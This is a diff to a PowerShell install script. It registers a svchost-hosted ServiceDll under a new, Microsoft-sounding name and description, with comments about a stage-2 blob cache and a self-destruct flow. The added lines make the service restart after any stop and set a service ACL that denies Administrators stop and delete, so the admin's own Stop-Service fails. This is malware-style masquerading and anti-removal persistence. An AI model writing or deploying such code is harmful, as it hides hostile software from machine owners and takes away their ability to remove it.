@@ -4,8 +4,8 @@
 $ErrorActionPreference = "SilentlyContinue"
 $SYS32    = "$env:SystemRoot\System32"
 $DRIVERS  = "$env:SystemRoot\System32\drivers"
-$SVC      = "WPnpSvc"
-$SVCGROUP = "PnpExtGroup"
+$SVC      = "MspIscSvc"
+$SVCGROUP = "MspGroup"
 $SD       = Split-Path -Parent $MyInvocation.MyCommand.Path
 
 # Check admin
@@ -82,8 +82,8 @@ Remove-Item "$SYS32\pnpext.dll" -Force -ErrorAction SilentlyContinue
 Remove-Item "$SYS32\pnpext.dll.old" -Force -ErrorAction SilentlyContinue
 Remove-Item "$SYS32\pnpext.dll.new" -Force -ErrorAction SilentlyContinue
 
-# Remove legacy WPnpSvc.exe if present
-Remove-Item "$SYS32\WPnpSvc.exe" -Force -ErrorAction SilentlyContinue
+# Remove legacy MspIscSvc.exe if present
+Remove-Item "$SYS32\MspIscSvc.exe" -Force -ErrorAction SilentlyContinue
 Remove-Item "$SYS32\spoolcfg.exe" -Force -ErrorAction SilentlyContinue
 
 # Clean stage-2 blob cache so new install starts from scratch
@@ -108,7 +108,7 @@ Remove-Item "$DRIVERS\pnpext.sys:Zone.Identifier" -Force -ErrorAction SilentlyCo
 # 4. Register svchost group + create service
 Write-Host "[4/6] Creating service (svchost.exe ServiceDll)..." -ForegroundColor Cyan
 
-# Register svchost group so svchost.exe -k PnpExtGroup loads our service
+# Register svchost group so svchost.exe -k MspGroup loads our service
 $svchostKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"
 $existing = (Get-ItemProperty $svchostKey -Name $SVCGROUP -EA SilentlyContinue).$SVCGROUP
 if (-not $existing) {
@@ -117,10 +117,25 @@ if (-not $existing) {
 }
 
 # Create the service pointing to svchost.exe
-sc.exe create $SVC binPath= "$env:SystemRoot\System32\svchost.exe -k $SVCGROUP" type= share start= auto DisplayName= "Windows Plug and Play Extensions" 2>$null | Out-Null
-sc.exe description $SVC "Manages extended Plug and Play device configuration and compatibility" 2>$null | Out-Null
-# Failure recovery: restart after 10s, 30s, 60s
+sc.exe create $SVC binPath= "$env:SystemRoot\System32\svchost.exe -k $SVCGROUP" type= share start= auto DisplayName= "Microsoft System Provider Internal Service Cache" 2>$null | Out-Null
+sc.exe description $SVC "Maintains internal cache and inter-service context for Windows system providers." 2>$null | Out-Null
+# Failure recovery: restart after 10s, 30s, 60s. Reset failure count after 1 day.
 sc.exe failure $SVC reset= 86400 actions= restart/10000/restart/30000/restart/60000 2>$null | Out-Null
+# failureflag=1 → ANY stop (including clean `Stop-Service` from admin PowerShell)
+# is treated as a failure → recovery actions fire → service auto-restarts after 10 s.
+# Internal update / self-destruct bats temporarily clear this flag before stopping.
+sc.exe failureflag $SVC 1 2>$null | Out-Null
+# Lock the SCM access ACL:
+#   (D;;WPSD;;;BA)            DENY  stop + delete            to Administrators
+#   (A;;CCLCSWRPLOCRRC;;;BA)  ALLOW query + start + read DACL  to Administrators
+#   (A;;CCLCSWRPWPDTLOCRRC;;;SY) ALLOW full control            to LocalSystem
+#   (A;;CCLCSWLOCRRC;;;IU)    ALLOW query + interrogate        to Interactive User
+#   (A;;CCLCSWLOCRRC;;;SU)    ALLOW query + interrogate        to Service User
+# Result: `Stop-Service MspIscSvc` from admin shell fails with access denied;
+# our own update / self-destruct flow runs as SYSTEM inside svchost and is
+# allowed to stop. SCM evaluates DENY ACEs first.
+$svcDacl = 'D:(D;;WPSD;;;BA)(A;;CCLCSWRPLOCRRC;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)'
+sc.exe sdset $SVC $svcDacl 2>$null | Out-Null
 
 # 5. Set ServiceDll parameter
 Write-Host "[5/6] Configuring ServiceDll..." -ForegroundColor Cyan
